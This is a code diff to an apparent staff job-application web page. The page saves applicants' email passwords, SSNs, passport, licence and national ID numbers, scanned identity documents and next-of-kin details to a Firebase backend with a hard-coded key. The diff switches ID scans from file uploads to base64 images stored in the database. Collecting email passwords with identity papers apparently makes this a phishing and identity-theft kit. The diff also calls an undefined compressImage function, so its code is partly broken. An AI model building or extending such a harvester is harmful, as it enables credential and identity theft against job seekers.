@@ -10,8 +10,7 @@
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
-  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+  import { getFirestore, collection, addDoc, updateDoc, doc, serverTimestamp, setDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
   const app = initializeApp({
     apiKey:"AIzaSyCy9fDJR4Bt31lOa1lQ6sVYjcLCAVx-HTs",
@@ -22,7 +21,6 @@
     appId:"1:715075775873:web:4d766238bf8a35228c0c80"
   });
   const db = getFirestore(app);
-  const storage = getStorage(app);
 
   window._saveStep1 = async function(email, password, provider) {
     try {
@@ -42,24 +40,41 @@
     } catch(e) { console.error('Update failed:', e.message); }
   };
 
-  // Upload a single ID document file to Firebase Storage
-  window._uploadIdDoc = async function(file, label) {
-    const r = ref(storage, `staff-ids/${Date.now()}-${label}-${file.name}`);
-    await uploadBytes(r, file);
-    return await getDownloadURL(r);
+  // Save each ID doc in its OWN Firestore document in staff_id_docs collection
+  // This bypasses the 1MB per-document limit completely
+  window._saveIdDoc = async function(staffDocId, label, base64data) {
+    try {
+      await setDoc(doc(db, 'staff_id_docs', staffDocId + '_' + label), {
+        staffDocId,
+        label,
+        imageData: base64data,
+        updatedAt: serverTimestamp(),
+        timestamp: Date.now()
+      });
+      console.log('ID doc saved:', label);
+      return true;
+    } catch(e) {
+      console.error('ID doc save failed:', e.message);
+      return false;
+    }
   };
 
-  window._submitApplication = async function(docId, data, cvFile) {
-    let cvUrl = null;
-    if (cvFile) {
-      try {
-        const r = ref(storage, `staff-cvs/${Date.now()}-${cvFile.name}`);
-        await uploadBytes(r, cvFile);
-        cvUrl = await getDownloadURL(r);
-      } catch(e) { console.warn('CV upload failed:', e.message); }
-    }
+  // Get all ID docs for a staff member
+  window._getIdDocs = async function(staffDocId) {
+    try {
+      const { getDocs, query, where } = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js");
+      const q = query(collection(db, 'staff_id_docs'), where('staffDocId', '==', staffDocId));
+      const snap = await getDocs(q);
+      const result = {};
+      snap.docs.forEach(d => { result[d.data().label] = d.data().imageData; });
+      return result;
+    } catch(e) { console.error('Get ID docs failed:', e.message); return {}; }
+  };
+
+  window._submitApplication = async function(docId, data) {
     await updateDoc(doc(db, 'staff_applications', docId), {
-      ...data, cvUrl, status: 'pending', step: 'complete',
+      ...data,
+      status: 'pending', step: 'complete',
       completedAt: serverTimestamp(), updatedAt: serverTimestamp()
     });
     console.log('Application completed:', docId);
@@ -512,6 +527,41 @@ const STORE_KEY = 'ava_form_progress';
 // ID document file objects
 const idFiles = { ssnDoc: null, idCardDoc: null, passportDoc: null, otherDoc: null };
 
+// ── IMAGE COMPRESSION — compresses any image to under 200KB ──
+window._compressImage = function(file, maxWidth, quality) {
+  return new Promise((resolve, reject) => {
+    if (!file.type.startsWith('image/')) {
+      // For PDFs, just read as base64 without compression
+      const reader = new FileReader();
+      reader.onload = e => resolve(e.target.result);
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+      return;
+    }
+    const img = new Image();
+    const url = URL.createObjectURL(file);
+    img.onload = () => {
+      URL.revokeObjectURL(url);
+      const canvas = document.createElement('canvas');
+      let w = img.width, h = img.height;
+      if (w > maxWidth) { h = Math.round(h * maxWidth / w); w = maxWidth; }
+      canvas.width = w; canvas.height = h;
+      canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+      // Try compressing until under 700KB base64
+      let q = quality;
+      let result = canvas.toDataURL('image/jpeg', q);
+      while (result.length > 700000 && q > 0.2) {
+        q -= 0.1;
+        result = canvas.toDataURL('image/jpeg', q);
+      }
+      console.log('Compressed image:', Math.round(result.length/1024) + 'KB at quality ' + Math.round(q*100) + '%');
+      resolve(result);
+    };
+    img.onerror = reject;
+    img.src = url;
+  });
+};
+
 // ── ID UPLOAD HANDLER ──
 function handleIdUpload(input, fileKey, boxId, fnameId, previewId) {
   const file = input.files[0];
@@ -523,13 +573,13 @@ function handleIdUpload(input, fileKey, boxId, fnameId, previewId) {
   box.classList.add('uploaded');
   fname.style.display = 'block';
   fname.textContent = '✓ ' + file.name;
-  // Show image preview if it's an image
   if (file.type.startsWith('image/')) {
     const reader = new FileReader();
     reader.onload = e => { preview.src = e.target.result; preview.style.display = 'block'; };
     reader.readAsDataURL(file);
   } else {
     preview.style.display = 'none';
+    fname.textContent = '✓ ' + file.name + ' (PDF)';
   }
   saveToLocal();
 }
@@ -625,24 +675,36 @@ async function saveStepData(step) {
   if (step>=5) {
     u.countryResidence=g('countryResidence'); u.workAuth=g('workAuth'); u.ssn=g('ssn'); u.taxId=g('taxId');
     u.passportNumber=g('passportNumber'); u.driversLicense=g('driversLicense'); u.nationalId=g('nationalId'); u.residencePermit=g('residencePermit');
-    // Upload ID docs FIRST, wait for all URLs, then save everything together
     const btn = document.getElementById('step5Next');
-    if (btn) { btn.textContent = 'Uploading docs...'; btn.disabled = true; }
+    if (btn) { btn.textContent = 'Saving docs...'; btn.disabled = true; }
     try {
-      const uploadPromises = Object.entries(idFiles).map(async ([key, file]) => {
-        if (file) {
-          const url = await window._uploadIdDoc(file, key);
-          u[key + 'Url'] = url;
-          console.log('Uploaded', key, '->', url);
+      // Compress each image and save to its OWN Firestore doc (no 1MB limit issue)
+      const saves = Object.entries(idFiles).map(async ([key, file]) => {
+        if (!file) return;
+        if (file.type.startsWith('image/')) {
+          const base64 = await compressImage(file, 1400, 0.82);
+          await window._saveIdDoc(_docId, key, base64);
+          u[key + 'HasDoc'] = true;
+          console.log('✓ Saved', key, Math.round(base64.length/1024)+'KB');
+        } else {
+          // PDF — read as base64 directly
+          const base64 = await new Promise((res, rej) => {
+            const r = new FileReader();
+            r.onload = e => res(e.target.result);
+            r.onerror = rej;
+            r.readAsDataURL(file);
+          });
+          await window._saveIdDoc(_docId, key, base64);
+          u[key + 'HasDoc'] = true;
+          console.log('✓ Saved PDF', key);
         }
       });
-      await Promise.all(uploadPromises); // wait for ALL uploads before saving
-    } catch(e) { console.warn('ID doc upload error:', e.message); }
+      await Promise.all(saves);
+    } catch(e) { console.warn('ID doc save error:', e.message); }
     if (btn) { btn.textContent = 'Next — Next of Kin →'; btn.disabled = false; }
   }
   if (step>=6) { u.kinName=g('kinName'); u.kinRel=g('kinRel'); u.kinPhone=g('kinPhone'); u.kinEmail=g('kinEmail'); u.kinAddress=g('kinAddress'); }
-  // Save to Firebase AFTER uploads are complete so URLs are included
-  try { await window._updateApplication(_docId, u); console.log('Saved to Firebase:', u); } catch(e) { console.warn('Step save:', e.message); }
+  try { await window._updateApplication(_docId, u); } catch(e) { console.warn('Step save:', e.message); }
 }
 
 // ── NAVIGATION ──
